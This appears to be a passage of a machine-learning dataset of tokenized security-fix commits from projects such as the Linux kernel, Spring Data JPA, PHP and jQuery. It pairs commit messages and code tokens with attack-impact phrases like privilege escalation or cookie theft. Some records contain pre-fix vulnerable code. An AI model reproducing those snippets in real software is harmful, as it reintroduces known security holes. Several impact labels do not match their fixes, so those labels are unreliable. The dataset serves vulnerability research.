"=", "\"", "repositories", "\"", ">", "<", "xsd", ":", "complexType", ">", "<", "xsd", ":", "complexContent", ">", "<", "xsd", ":", "extension", "base", "=", "\"", "repository", ":", "repositories", "\"", ">", "<", "xsd", ":", "attributeGroup", "ref", "=", "\"", "repository", ":", "transactional", "-", "repository", "-", "attributes", "\"", "/", ">", "<", "xsd", ":", "attribute", "name", "=", "\"", "entity", "-", "manager", "-", "factory", "-", "ref", "\"", "type", "=", "\"", "entityManagerFactoryRef", "\"", "/", ">", "<", "xsd", ":", "attribute", "name", "=", "\"", "enable", "-", "default", "-", "transactions", "\"", "type", "=", "\"", "xsd", ":", "boolean", "\"", ">", "<", "xsd", ":", "annotation", ">", "<", "xsd", ":", "documentation", ">", "<!", "[", "CDATA", "[", "Controls", "whether", "repositories", "get", "transactions", "enabled", "by", "default", ".", "]", "]>", "</", "xsd", ":", "documentation", ">", "<", "/", "xsd", ":", "annotation", ">", "<", "/", "xsd", ":", "attribute", ">", "<", "xsd", ":", "attribute", "name", "=", "\"", "escape", "-", "character", "\"", "type", "=", "\"", "xsd", ":", "string", "\"", "default", "=", "\"\\", "\">", "<", "xsd", ":", "annotation", ">", "<", "xsd", ":", "documentation", ">", "<!", "[", "CDATA", "[", "Configures", "what", "character", "is", "used", "to", "escape", "the", "LIKE", "wildcards", "_", "and", "%", "in", "derived", "queries", "with", "contains", ",", "startsWith", "or", "endsWith", "clauses", ".", "Defaults", "to", "\\", ".", "]", "]>", "</", "xsd", ":", "documentation", ">", "<", "/", "xsd", ":", "annotation", ">", "<", "/", "xsd", ":", "attribute", ">", "<", "/", "xsd", ":", "extension", ">", "<", "/", "xsd", ":", "complexContent", ">", "<", "/", "xsd", ":", "complexType", ">", "<", "/", "xsd", ":", "element", ">", "<", "xsd", ":", "element", "name", "=", "\"", "auditing", "\"", ">", "<", "xsd", ":", "annotation", ">", "<", "xsd", ":", "appinfo", ">", "<", "tool", ":", "annotation", ">", "<", "tool", ":", "exports", "type", "=", "\"", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "domain", ".", "support", ".", "AuditingEntityListener", "\"", "/", ">", "<", "tool", ":", "exports", "type", "=", "\"", "org", ".", "springframework", ".", "data", ".", "auditing", ".", "AuditingHandler", "\"", "/", ">", "<", "/", "tool", ":", "annotation", ">", "<", "/", "xsd", ":", "appinfo", ">", "<", "/", "xsd", ":", "annotation", ">", "<", "xsd", ":", "complexType", ">", "<", "xsd", ":", "attributeGroup", "ref", "=", "\"", "repository", ":", "auditing", "-", "attributes", "\"", "/", ">", "<", "/", "xsd", ":", "complexType", ">", "<", "/", "xsd", ":", "element", ">", "<", "xsd", ":", "simpleType", "name", "=", "\"", "entityManagerFactoryRef", "\"", ">", "<", "xsd", ":", "annotation", ">", "<", "xsd", ":", "appinfo", ">", "<", "tool", ":", "annotation", "kind", "=", "\"", "ref", "\"", ">", "<", "tool", ":", "assignable", "-", "to", "type", "=", "\"", "org", ".", "springframework", ".", "orm", ".", "jpa", ".", "AbstractEntityManagerFactoryBean", "\"", "/", ">", "<", "/", "tool", ":", "annotation", ">", "<", "/", "xsd", ":", "appinfo", ">", "<", "/", "xsd", ":", "annotation", ">", "<", "xsd", ":", "union", "memberTypes", "=", "\"", "xsd", ":", "string", "\"", "/", ">", "<", "/", "xsd", ":", "simpleType", ">", "<", "/", "xsd", ":", "schema", ">", "@", "Query", "(", "\"", "select", "u", "from", "User", "u", "where", "u", ".", "firstname", "like", "%", "?#", "{", "escape", "(", "[", "0", "]", ")}", "%", "escape", "'", "\\\\", "'\"", ")</s>try", "{", "return", "AnnotationRepositoryConfigurationSource", ".", "class", ".", "isInstance", "(", "source", ")", "/", "/", "?", "(", "Character", ")", "AnnotationRepositoryConfigurationSource", ".", "class", ".", "cast", "(", "source", ")", ".", "getAttributes", "(", ")", ".", "get", "(", "\"", "escapeCharacter", "\"", ")", "/", "/", ":", "source", ".", "getAttribute", "(", "\"", "escapeCharacter", "\"", ").", "toCharArray", "(", ")[", "0", "]", ";", "}", "catch", "(", "IllegalArgumentException", "___", ")", "{", "return", "null", ";", "package", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ";", "*", "A", "Value", "-", "class", "encapsulating", "an", "escape", "character", "for", "LIKE", "queries", "and", "the", "actually", "usage", "of", "it", "in", "escaping", "Strings", ".", "return", "value", ".", "replace", "(", "\"", "_", "\"", ",", "value", "+", "\"", "_", "\"", ").", "replace", "(", "\"%", "\",", "value", "+", "\"", "%\"", ");", "}", "/", "/", "used", "for", "SpEL", "expressions", "static", "String", "escape", "(", "String", "value", ",", "String", "escape", ")", "{", "Assert", ".", "hasText", "(", "escape", ",", "\"", "escape", "must", "be", "a", "sinlge", "character", "String", ".", "\")", ";", "char", "[", "]", "chars", "=", "escape", ".", "toCharArray", "(", ");", "Assert", ".", "isTrue", "(", "chars", ".", "length", "=", "=", "1", ",", "\"", "escape", "must", "be", "a", "single", "character", "String", ".", "\")", ";", "return", "EscapeCharacter", ".", "of", "(", "chars", "[", "0", "]", ").", "escape", "(", "value", ")", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "http", "\\", ":/", "/", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "jpa", "/", "spring", "-", "jpa", ".", "xsd", "=", "org", "/", "springframework", "/", "data", "/", "jpa", "/", "repository", "/", "config", "/", "spring", "-", "jpa", "-", "1", ".", "8", ".", "xsd", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "EscapeCharacter", ";", "@", "Query", "(", "\"", "select", "u", "from", "User", "u", "where", "u", ".", "firstname", "like", "%", "?#", "{#", "escape", "(", "[", "0", "]", ",'", "#'", ")}", "%", "escape", "'", "#'", "\")"], "docstring_tokens": ["obtain", "sensitive", "information"]}
{"contents": ["compat:", "fix", "4-byte", "infoleak", "via", "uninitialized", "struct", "field", "Commit", "3a4d44b61625", "(\"ntp:", "Move", "adjtimex", "related", "compat", "syscalls", "to", "native", "counterparts\")", "removed", "the", "memset()", "in", "compat_get_timex().", "Since", "then,", "the", "compat", "adjtimex", "syscall", "can", "invoke", "do_adjtimex()", "with", "an", "uninitialized", "->tai.", "If", "do_adjtimex()", "doesn't", "write", "to", "->tai", "(e.g.", "because", "the", "arguments", "are", "invalid),", "compat_put_timex()", "then", "copies", "the", "uninitialized", "->tai", "field", "to", "userspace.", "Fix", "it", "by", "adding", "the", "memset()", "back.", "Fixes:", "3a4d44b61625", "(\"ntp:", "Move", "adjtimex", "related", "compat", "syscalls", "to", "native", "counterparts\")", "Signed-off-by:", "Jann", "Horn", "<jannh@google.com>", "Acked-by:", "Kees", "Cook", "<keescook@chromium.org>", "Acked-by:", "Al", "Viro", "<viro@zeniv.linux.org.uk>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["memset", "(", "txc", ",", "0", ",", "sizeof", "(", "struct", "timex", ")", ");</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "memory"]}
{"contents": ["https://github.com/ImageMagick/ImageMagick/issues/131"], "code_tokens": ["quantum_info", "=", "DestroyQuantumInfo", "(", "quantum_info", ")", ";</s>"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(out-of-bounds", "read", "and", "application", "crash", ")"]}
{"contents": ["drm/i915:", "Fix", "i965", "secured", "batchbuffer", "usage", "This", "965G", "and", "above", "chipsets", "moved", "the", "batch", "buffer", "non-secure", "bits", "to", "another", "place.", "This", "means", "that", "previous", "drm's", "allowed", "in-secure", "batchbuffers", "to", "be", "submitted", "to", "the", "hardware", "from", "non-privileged", "users", "who", "are", "logged", "into", "X", "and", "and", "have", "access", "to", "direct", "rendering.", "Signed-off-by:", "Dave", "Airlie", "<airlied@redhat.com>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "IS_I965G", "(", "dev", ")", ")", "/", "*", "965", "doesn", "'", "t", "support", "older", "method", "*", "/", "dev_priv", "-", ">", "use_mi_batchbuffer_start", "=", "1", ";", "if", "(", "IS_I965G", "(", "dev", ")", ")", "{", "OUT_RING", "(", "MI_BATCH_BUFFER_START", "|", "(", "2", "<", "<", "6", ")", "|", "MI_BATCH_NON_SECURE_I965", ")", ";", "OUT_RING", "(", "batch", "-", ">", "start", ")", ";", "}", "else", "{", "OUT_RING", "(", "MI_BATCH_BUFFER_START", "|", "(", "2", "<", "<", "6", ")", ");", "OUT_RING", "(", "batch", "-", ">", "start", "|", "MI_BATCH_NON_SECURE", ")", ";", "}", "if", "(", "!", "IS_I965G", "(", "dev", ")", ")", "dev_priv", "-", ">", "use_mi_batchbuffer_start", "=", "param", ".", "value", ";", "#", "define", "MI_BATCH_NON_SECURE_I965", "(", "1", "<", "<", "8", ")</s>OUT_RING", "(", "MI_BATCH_BUFFER_START", "|", "(", "2", "<", "<", "6", ")", ");", "OUT_RING", "(", "batch", "-", ">", "start", "|", "MI_BATCH_NON_SECURE", ")", ";", "dev_priv", "-", ">", "use_mi_batchbuffer_start", "=", "param", ".", "value", ";"], "docstring_tokens": ["gain", "elevated", "privileges", "and", "write", "to", "arbitrary", "memory", "locations", "on", "the", "vulnerable", "system"]}
{"contents": ["Merge", "branch", "'PHP-5.6'", "*", "PHP-5.6:", "Fix", "potential", "segfault", "in", "dns_get_record()"], "code_tokens": ["if", "(", "(", "ll", "+", "n", ")", ">", "=", "dlen", ")", "{", "/", "/", "Invalid", "chunk", "length", ",", "truncate", "n", "=", "dlen", "-", "(", "ll", "+", "1", ")", ";", "}</s>"], "docstring_tokens": ["overflow", "a", "buffer", "and", "execute", "arbitrary", "code", "on", "the", "system", "or", "cause", "the", "application", "to", "crash"]}
{"contents": ["Adjust", "jQuery('html')", "detection", "to", "only", "match", "when", "html", "starts", "with", "'<'", "(not", "counting", "space", "characters).", "Fixes", "#11290."], "code_tokens": ["/", "/", "Strict", "HTML", "recognition", "(", "#", "11290", ":", "must", "start", "with", "<", ")", "rquickExpr", "=", "/", "^(", "?:", "(<", "[\\", "w", "\\", "W", "]", "+>", ")[", "^>", "]*", "|#", "([", "\\", "w", "-", "]*", "))", "$/", ",", "Subproject", "commit", "8c6ed151bdfd03b8a8ec3707963caada8e73d041", "@", "@", "-", "27", ",", "7", "+", "27", ",", "7", "@", "@", "test", "(", "\"", "jQuery", "(", ")\"", ",", "function", "(", ")", "{", "expected", "=", "22", ",", "expect", "(", "13", ")", ";", "equal", "(", "jQuery", ".", "parseHTML", "(", "\"", "<", "div", "/", ">", "\"", ")[", "0", "]", ".", "nodeType", ",", "3", ",", "\"", "Leading", "spaces", "are", "treated", "as", "text", "nodes", "(", "#", "11290", ")", "\"", ")", ";", "/", "/", "#", "7533", "test", "(", "\"", "jQuery", "only", "-", "broken", "\"", ",", "1", ",", "function", "(", ")", "{", "raises", "(", "function", "(", ")", "{", "/", "/", "Setting", "context", "to", "null", "here", "somehow", "avoids", "QUnit", "'", "s", "window", ".", "error", "handling", "/", "/", "making", "the", "e", "&", "e", ".", "message", "correct", "/", "/", "For", "whatever", "reason", ",", "without", "this", ",", "/", "/", "Sizzle", ".", "error", "will", "be", "called", "but", "no", "error", "will", "be", "seen", "in", "oldIE", "jQuery", ".", "call", "(", "null", ",", "\"", "<", "div", "/", ">", "\"", ")", ";", "}", ",", "function", "(", "e", ")", "{", "return", "e", ".", "message", ".", "indexOf", "(", "\"", "Syntax", "error", "\"", ")", ">", "=", "0", ";", "}", ",", "\"", "leading", "space", "invalid", ":", "$", "('", "<", "div", "/", ">", "'", ")\"", ")", ";", "}", ");", "equal", "(", "jQuery", "(", "sel", ")", ".", "is", "(", "match", ")", ",", "expect", ",", "\"", "jQuery", "(", "'\"", "+", "sel", "+", "\"", "')", ".", "is", "(", "'\"", "+", "match", "+", "\"", "')", "\"", ")", ";</s>rquickExpr", "=", "/", "^(", "?:", "[^", "#<", "]*", "(<", "[\\", "w", "\\", "W", "]", "+>", ")[", "^>", "]*", "|#", "([", "\\", "w", "-", "]*", "))", "$/", ",", "Subproject", "commit", "20ad5f811e22bf8528d8c33f0e7966fdb461c55a", "expected", "=", "26", ",", "equal", "(", "jQuery", "(", "\"", "<", "div", "/", ">", "\"", ").", "length", ",", "1", ",", "\"", "Make", "sure", "whitespace", "is", "trimmed", ".", "\"", ")", ";", "equal", "(", "jQuery", "(", "\"", "a", "<", "div", "/", ">", "b", "\"", ").", "length", ",", "1", ",", "\"", "Make", "sure", "whitespace", "and", "other", "characters", "are", "trimmed", ".", "\"", ")", ";", "equal", "(", "jQuery", "(", "\"", "<", "div", ">", "\"", "+", "lng", "+", "\"", "</", "div", ">", "\"", ").", "length", ",", "1", ",", "\"", "Make", "sure", "whitespace", "is", "trimmed", "on", "long", "strings", ".", "\"", ")", ";", "equal", "(", "jQuery", "(", "\"", "a", "<", "div", ">", "\"", "+", "lng", "+", "\"", "</", "div", ">", "b", "\"", ").", "length", ",", "1", ",", "\"", "Make", "sure", "whitespace", "and", "other", "characters", "are", "trimmed", "on", "long", "strings", ".", "\"", ")", ";", "expect", "(", "12", ")", ";", "/", "/#", "7533", "equal", "(", "jQuery", "(", "sel", ")", ".", "is", "(", "match", ")", ",", "expect", ",", "\"", "jQuery", "(", "\"", "+", "sel", "+", "\"", ")", ".", "is", "(", "\"", "+", "match", "+", "\"", ")", "\"", ")", ";"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["NLM:", "Don't", "hang", "forever", "on", "NLM", "unlock", "requests", "If", "the", "NLM", "daemon", "is", "killed", "on", "the", "NFS", "server,", "we", "can", "currently", "end", "up", "hanging", "forever", "on", "an", "'unlock'", "request,", "instead", "of", "aborting.", "Basically,", "if", "the", "rpcbind", "request", "fails,", "or", "the", "server", "keeps", "returning", "garbage,", "we", "really", "want", "to", "quit", "instead", "of", "retrying.", "Tested-by:", "Vasily", "Averin", "<vvs@sw.ru>", "Signed-off-by:", "Trond", "Myklebust", "<Trond.Myklebust@netapp.com>", "Cc:", "stable@kernel.org"], "code_tokens": ["switch", "(", "task", "-", ">", "tk_status", ")", "{", "case", "-", "EACCES", ":", "case", "-", "EIO", ":", "goto", "die", ";", "default", ":", "goto", "retry_rebind", ";", "}", "tk_cred_retry", ":", "2", ",", "tk_rebind_retry", ":", "2", ";", "if", "(", "task", "-", ">", "tk_rebind_retry", "=", "=", "0", ")", "break", ";", "task", "-", ">", "tk_rebind_retry", "-", "-;", "task", "-", ">", "tk_rebind_retry", "=", "2", ";</s>goto", "retry_rebind", ";", "tk_cred_retry", ":", "2", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(system", "hang", ")"]}
{"contents": ["Fix", "for", "bug", "#76582", "The", "brigade", "seems", "to", "end", "up", "in", "a", "messed", "up", "state", "if", "something", "fails", "in", "shutdown,", "so", "we", "clean", "it", "up."], "code_tokens": ["apr_brigade_cleanup", "(", "brigade", ")", ";</s>"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["ipv4:", "fix", "a", "race", "in", "ip4_datagram_release_cb()", "Alexey", "gave", "a", "AddressSanitizer[1]", "report", "that", "finally", "gave", "a", "good", "hint", "at", "where", "was", "the", "origin", "of", "various", "problems", "already", "reported", "by", "Dormando", "in", "the", "past", "[2]", "Problem", "comes", "from", "the", "fact", "that", "UDP", "can", "have", "a", "lockless", "TX", "path,", "and", "concurrent", "threads", "can", "manipulate", "sk_dst_cache,", "while", "another", "thread,", "is", "holding", "socket", "lock", "and", "calls", "__sk_dst_set()", "in", "ip4_datagram_release_cb()", "(this", "was", "added", "in", "linux-3.8)", "It", "seems", "that", "all", "we", "need", "to", "do", "is", "to", "use", "sk_dst_check()", "and", "sk_dst_set()", "so", "that", "all", "the", "writers", "hold", "same", "spinlock", "(sk->sk_dst_lock)", "to", "prevent", "corruptions.", "TCP", "stack", "do", "not", "need", "this", "protection,", "as", "all", "sk_dst_cache", "writers", "hold", "the", "socket", "lock.", "[1]", "https://code.google.com/p/address-sanitizer/wiki/AddressSanitizerForKernel", "AddressSanitizer:", "heap-use-after-free", "in", "ipv4_dst_check", "Read", "of", "size", "2", "by", "thread", "T15453:", "[<ffffffff817daa3a>]", "ipv4_dst_check+0x1a/0x90", "./net/ipv4/route.c:1116", "[<ffffffff8175b789>]", "__sk_dst_check+0x89/0xe0", "./net/core/sock.c:531", "[<ffffffff81830a36>]", "ip4_datagram_release_cb+0x46/0x390", "??:0", "[<ffffffff8175eaea>]", "release_sock+0x17a/0x230", "./net/core/sock.c:2413", "[<ffffffff81830882>]", "ip4_datagram_connect+0x462/0x5d0", "??:0", "[<ffffffff81846d06>]", "inet_dgram_connect+0x76/0xd0", "./net/ipv4/af_inet.c:534", "[<ffffffff817580ac>]", "SYSC_connect+0x15c/0x1c0", "./net/socket.c:1701", "[<ffffffff817596ce>]", "SyS_connect+0xe/0x10", "./net/socket.c:1682", "[<ffffffff818b0a29>]", "system_call_fastpath+0x16/0x1b", "./arch/x86/kernel/entry_64.S:629", "Freed", "by", "thread", "T15455:", "[<ffffffff8178d9b8>]", "dst_destroy+0xa8/0x160", "./net/core/dst.c:251", "[<ffffffff8178de25>]", "dst_release+0x45/0x80", "./net/core/dst.c:280", "[<ffffffff818304c1>]", "ip4_datagram_connect+0xa1/0x5d0", "??:0", "[<ffffffff81846d06>]", "inet_dgram_connect+0x76/0xd0", "./net/ipv4/af_inet.c:534", "[<ffffffff817580ac>]", "SYSC_connect+0x15c/0x1c0", "./net/socket.c:1701", "[<ffffffff817596ce>]", "SyS_connect+0xe/0x10", "./net/socket.c:1682", "[<ffffffff818b0a29>]", "system_call_fastpath+0x16/0x1b", "./arch/x86/kernel/entry_64.S:629", "Allocated", "by", "thread", "T15453:", "[<ffffffff8178d291>]", "dst_alloc+0x81/0x2b0", "./net/core/dst.c:171", "[<ffffffff817db3b7>]", "rt_dst_alloc+0x47/0x50", "./net/ipv4/route.c:1406", "[<", "inlined", ">]", "__ip_route_output_key+0x3e8/0xf70", "__mkroute_output", "./net/ipv4/route.c:1939", "[<ffffffff817dde08>]", "__ip_route_output_key+0x3e8/0xf70", "./net/ipv4/route.c:2161", "[<ffffffff817deb34>]", "ip_route_output_flow+0x14/0x30", "./net/ipv4/route.c:2249", "[<ffffffff81830737>]", "ip4_datagram_connect+0x317/0x5d0", "??:0", "[<ffffffff81846d06>]", "inet_dgram_connect+0x76/0xd0", "./net/ipv4/af_inet.c:534", "[<ffffffff817580ac>]", "SYSC_connect+0x15c/0x1c0", "./net/socket.c:1701", "[<ffffffff817596ce>]", "SyS_connect+0xe/0x10", "./net/socket.c:1682", "[<ffffffff818b0a29>]", "system_call_fastpath+0x16/0x1b", "./arch/x86/kernel/entry_64.S:629", "[2]", "<4>[196727.311203]", "general", "protection", "fault:", "0000", "[#1]", "SMP", "<4>[196727.311224]", "Modules", "linked", "in:", "xt_TEE", "xt_dscp", "xt_DSCP", "macvlan", "bridge", "coretemp", "crc32_pclmul", "ghash_clmulni_intel", "gpio_ich", "microcode", "ipmi_watchdog", "ipmi_devintf", "sb_edac", "edac_core", "lpc_ich", "mfd_core", "tpm_tis", "tpm", "tpm_bios", "ipmi_si", "ipmi_msghandler", "isci", "igb", "libsas", "i2c_algo_bit", "ixgbe", "ptp", "pps_core", "mdio", "<4>[196727.311333]", "CPU:", "17", "PID:", "0", "Comm:", "swapper/17", "Not", "tainted", "3.10.26", "#1", "<4>[196727.311344]", "Hardware", "name:", "Supermicro", "X9DRi-LN4+/X9DR3-LN4+/X9DRi-LN4+/X9DR3-LN4+,", "BIOS", "3.0", "07/05/2013", "<4>[196727.311364]", "task:", "ffff885e6f069700", "ti:", "ffff885e6f072000", "task.ti:", "ffff885e6f072000", "<4>[196727.311377]", "RIP:", "0010:[<ffffffff815f8c7f>]", "[<ffffffff815f8c7f>]", "ipv4_dst_destroy+0x4f/0x80", "<4>[196727.311399]", "RSP:", "0018:ffff885effd23a70", "EFLAGS:", "00010282", "<4>[196727.311409]", "RAX:", "dead000000200200", "RBX:", "ffff8854c398ecc0", "RCX:", "0000000000000040", "<4>[196727.311423]", "RDX:", "dead000000100100", "RSI:", "dead000000100100", "RDI:", "dead000000200200", "<4>[196727.311437]", "RBP:", "ffff885effd23a80", "R08:", "ffffffff815fd9e0", "R09:", "ffff885d5a590800", "<4>[196727.311451]", "R10:", "0000000000000000", "R11:", "0000000000000000", "R12:", "0000000000000000", "<4>[196727.311464]", "R13:", "ffffffff81c8c280", "R14:", "0000000000000000", "R15:", "ffff880e85ee16ce", "<4>[196727.311510]", "FS:", "0000000000000000(0000)", "GS:ffff885effd20000(0000)", "knlGS:0000000000000000", "<4>[196727.311554]", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "<4>[196727.311581]", "CR2:", "00007a46751eb000", "CR3:", "0000005e65688000", "CR4:", "00000000000407e0", "<4>[196727.311625]", "DR0:", "0000000000000000", "DR1:", "0000000000000000", "DR2:", "0000000000000000", "<4>[196727.311669]", "DR3:", "0000000000000000", "DR6:", "00000000ffff0ff0", "DR7:", "0000000000000400", "<4>[196727.311713]", "Stack:", "<4>[196727.311733]", "ffff8854c398ecc0", "ffff8854c398ecc0", "ffff885effd23ab0", "ffffffff815b7f42", "<4>[196727.311784]", "ffff88be6595bc00", "ffff8854c398ecc0", "0000000000000000", "ffff8854c398ecc0", "<4>[196727.311834]", "ffff885effd23ad0", "ffffffff815b86c6", "ffff885d5a590800", "ffff8816827821c0", "<4>[196727.311885]", "Call", "Trace:", "<4>[196727.311907]", "<IRQ>", "<4>[196727.311912]", "[<ffffffff815b7f42>]", "dst_destroy+0x32/0xe0", "<4>[196727.311959]", "[<ffffffff815b86c6>]", "dst_release+0x56/0x80", "<4>[196727.311986]", "[<ffffffff81620bd5>]", "tcp_v4_do_rcv+0x2a5/0x4a0", "<4>[196727.312013]", "[<ffffffff81622b5a>]", "tcp_v4_rcv+0x7da/0x820", "<4>[196727.312041]", "[<ffffffff815fd9e0>]", "?", "ip_rcv_finish+0x360/0x360", "<4>[196727.312070]", "[<ffffffff815de02d>]", "?", "nf_hook_slow+0x7d/0x150", "<4>[196727.312097]", "[<ffffffff815fd9e0>]", "?", "ip_rcv_finish+0x360/0x360", "<4>[196727.312125]", "[<ffffffff815fda92>]", "ip_local_deliver_finish+0xb2/0x230", "<4>[196727.312154]", "[<ffffffff815fdd9a>]", "ip_local_deliver+0x4a/0x90", "<4>[196727.312183]", "[<ffffffff815fd799>]", "ip_rcv_finish+0x119/0x360", "<4>[196727.312212]", "[<ffffffff815fe00b>]", "ip_rcv+0x22b/0x340", "<4>[196727.312242]", "[<ffffffffa0339680>]", "?", "macvlan_broadcast+0x160/0x160", "[macvlan]", "<4>[196727.312275]", "[<ffffffff815b0c62>]", "__netif_receive_skb_core+0x512/0x640", "<4>[196727.312308]", "[<ffffffff811427fb>]", "?", "kmem_cache_alloc+0x13b/0x150", "<4>[196727.312338]", "[<ffffffff815b0db1>]", "__netif_receive_skb+0x21/0x70", "<4>[196727.312368]", "[<ffffffff815b0fa1>]", "netif_receive_skb+0x31/0xa0", "<4>[196727.312397]", "[<ffffffff815b1ae8>]", "napi_gro_receive+0xe8/0x140", "<4>[196727.312433]", "[<ffffffffa00274f1>]", "ixgbe_poll+0x551/0x11f0", "[ixgbe]", "<4>[196727.312463]", "[<ffffffff815fe00b>]", "?", "ip_rcv+0x22b/0x340", "<4>[196727.312491]", "[<ffffffff815b1691>]", "net_rx_action+0x111/0x210", "<4>[196727.312521]", "[<ffffffff815b0db1>]", "?", "__netif_receive_skb+0x21/0x70", "<4>[196727.312552]", "[<ffffffff810519d0>]", "__do_softirq+0xd0/0x270", "<4>[196727.312583]", "[<ffffffff816cef3c>]", "call_softirq+0x1c/0x30", "<4>[196727.312613]", "[<ffffffff81004205>]", "do_softirq+0x55/0x90", "<4>[196727.312640]", "[<ffffffff81051c85>]", "irq_exit+0x55/0x60", "<4>[196727.312668]", "[<ffffffff816cf5c3>]", "do_IRQ+0x63/0xe0", "<4>[196727.312696]", "[<ffffffff816c5aaa>]", "common_interrupt+0x6a/0x6a", "<4>[196727.312722]", "<EOI>", "<1>[196727.313071]", "RIP", "[<ffffffff815f8c7f>]", "ipv4_dst_destroy+0x4f/0x80", "<4>[196727.313100]", "RSP", "<ffff885effd23a70>", "<4>[196727.313377]", "---[", "end", "trace", "64b3f14fae0f2e29", "]---", "<0>[196727.380908]", "Kernel", "panic", "-", "not", "syncing:", "Fatal", "exception", "in", "interrupt", "Reported-by:", "Alexey", "Preobrazhensky", "<preobr@google.com>", "Reported-by:", "dormando", "<dormando@rydia.ne>", "Signed-off-by:", "Eric", "Dumazet", "<edumazet@google.com>", "Fixes:", "8141ed9fcedb2", "(\"ipv4:", "Add", "a", "socket", "release", "callback", "for", "datagram", "sockets\")", "Cc:", "Steffen", "Klassert", "<steffen.klassert@secunet.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["/", "*", "Because", "UDP", "xmit", "path", "can", "manipulate", "sk_dst_cache", "without", "holding", "*", "socket", "lock", ",", "we", "need", "to", "use", "sk_dst_set", "(", ")", "here", ",", "*", "even", "if", "we", "own", "the", "socket", "lock", ".", "*", "/", "struct", "dst_entry", "*", "dst", ";", "dst", "=", "__sk_dst_get", "(", "sk", ")", ";", "if", "(", "!", "dst", "|", "|", "!", "dst", "-", ">", "obsolete", "|", "|", "dst", "-", ">", "ops", "-", ">", "check", "(", "dst", ",", "0", ")", ")", "{", "rcu_read_unlock", "(", ");", "return", ";", "}", "dst", "=", "!", "IS_ERR", "(", "rt", ")", "?", "&", "rt", "-", ">", "dst", ":", "NULL", ";", "sk_dst_set", "(", "sk", ",", "dst", ")", ";</s>if", "(", "!", "__sk_dst_get", "(", "sk", ")", "|", "|", "__sk_dst_check", "(", "sk", ",", "0", ")", ")", "return", ";", "if", "(", "!", "IS_ERR", "(", "rt", ")", ")", "__sk_dst_set", "(", "sk", ",", "&", "rt", "-", ">", "dst", ")", ";"], "docstring_tokens": ["gain", "privileges", "or", "cause", "a", "denial", "of", "service", "(use-after-free", ")"]}
{"contents": ["fscrypt:", "remove", "broken", "support", "for", "detecting", "keyring", "key", "revocation", "Filesystem", "encryption", "ostensibly", "supported", "revoking", "a", "keyring", "key", "that", "had", "been", "used", "to", "\"unlock\"", "encrypted", "files,", "causing", "those", "files", "to", "become", "\"locked\"", "again.", "This", "was,", "however,", "buggy", "for", "several", "reasons,", "the", "most", "severe", "of", "which", "was", "that", "when", "key", "revocation", "happened", "to", "be", "detected", "for", "an", "inode,", "its", "fscrypt_info", "was", "immediately", "freed,", "even", "while", "other", "threads", "could", "be", "using", "it", "for", "encryption", "or", "decryption", "concurrently.", "This", "could", "be", "exploited", "to", "crash", "the", "kernel", "or", "worse.", "This", "patch", "fixes", "the", "use-after-free", "by", "removing", "the", "code", "which", "detects", "the", "keyring", "key", "having", "been", "revoked,", "invalidated,", "or", "expired.", "Instead,", "an", "encrypted", "inode", "that", "is", "\"unlocked\"", "now", "simply", "remains", "unlocked", "until", "it", "is", "evicted", "from", "memory.", "Note", "that", "this", "is", "no", "worse", "than", "the", "case", "for", "block", "device-level", "encryption,", "e.g.", "dm-crypt,", "and", "it", "still", "remains", "possible", "for", "a", "privileged", "user", "to", "evict", "unused", "pages,", "inodes,", "and", "dentries", "by", "running", "'sync;", "echo", "3", ">", "/proc/sys/vm/drop_caches',", "or", "by", "simply", "unmounting", "the", "filesystem.", "In", "fact,", "one", "of", "those", "actions", "was", "already", "needed", "anyway", "for", "key", "revocation", "to", "work", "even", "somewhat", "sanely.", "This", "change", "is", "not", "expected", "to", "break", "any", "applications.", "In", "the", "future", "I'd", "like", "to", "implement", "a", "real", "API", "for", "fscrypt", "key", "revocation", "that", "interacts", "sanely", "with", "ongoing", "filesystem", "operations", "---", "waiting", "for", "existing", "operations", "to", "complete", "and", "blocking", "new", "operations,", "and", "invalidating", "and", "sanitizing", "key", "material", "and", "plaintext", "from", "the", "VFS", "caches.", "But", "this", "is", "a", "hard", "problem,", "and", "for", "now", "this", "bug", "must", "be", "fixed.", "This", "bug", "affected", "almost", "all", "versions", "of", "ext4,", "f2fs,", "and", "ubifs", "encryption,", "and", "it", "was", "potentially", "reachable", "in", "any", "kernel", "configured", "with", "encryption", "support", "(CONFIG_EXT4_ENCRYPTION=y,", "CONFIG_EXT4_FS_ENCRYPTION=y,", "CONFIG_F2FS_FS_ENCRYPTION=y,", "or", "CONFIG_UBIFS_FS_ENCRYPTION=y).", "Note", "that", "older", "kernels", "did", "not", "use", "the", "shared", "fs/crypto/", "code,", "but", "due", "to", "the", "potential", "security", "implications", "of", "this", "bug,", 